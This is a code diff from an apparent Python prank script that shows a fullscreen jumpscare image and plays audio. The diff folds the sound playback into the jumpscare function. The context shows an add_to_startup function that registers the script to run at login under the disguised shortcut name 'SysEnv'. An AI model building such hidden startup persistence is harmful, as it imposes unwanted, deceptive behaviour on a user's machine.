@@ -70,11 +70,7 @@ def show_fullscreen_jumpscare():
     label = tk.Label(root, image=tk_img)
     label.pack()
 
-    root.after(1000, root.destroy)
-
-    root.mainloop()
-
-def play_sound():
+    #Audio
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
 
@@ -82,6 +78,11 @@ def play_sound():
     pygame.mixer.init()
     pygame.mixer.music.load(audio_path)
     pygame.mixer.music.play()
+
+    root.after(1000, root.destroy)
+
+    root.mainloop()
+
 
 def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):
 
